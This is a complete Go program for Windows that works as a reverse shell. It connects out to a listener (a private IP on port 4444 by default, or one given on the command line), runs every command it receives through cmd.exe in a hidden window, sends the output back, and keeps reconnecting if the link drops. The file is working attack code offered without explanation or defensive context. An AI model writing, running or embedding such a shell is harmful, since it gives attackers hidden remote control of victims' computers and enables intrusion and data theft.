package main

import (
	"bufio"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

const default_host = "192.168.18.128:4444"

func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if err != nil {
		if c != nil {
			c.Close()
			log.Fatal(err.Error())
		}
		fmt.Println("Error:", err.Error())

		if strings.Contains(err.Error(), "missing port in address") {
			fmt.Println("Make sure to specify host with IP:PORT")
			os.Exit(1)
		}

		fmt.Println("Waiting 5 seconds...")
		time.Sleep(time.Second * 5)

		reverse(host)
	}

	fmt.Println("Connecting to", host)

	for {
		status, err := bufio.NewReader(c).ReadString('\n')
		if nil != err {
			c.Close()
			reverse(host)
			return
		}

		cmd := exec.Command("cmd", "/C", status)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, _ := cmd.CombinedOutput()

		c.Write(out)
	}
}

func main() {
	var host string

	if len(os.Args) < 2 {
		host = default_host
	} else {
		host = os.Args[1]
	}
	reverse(host)
}
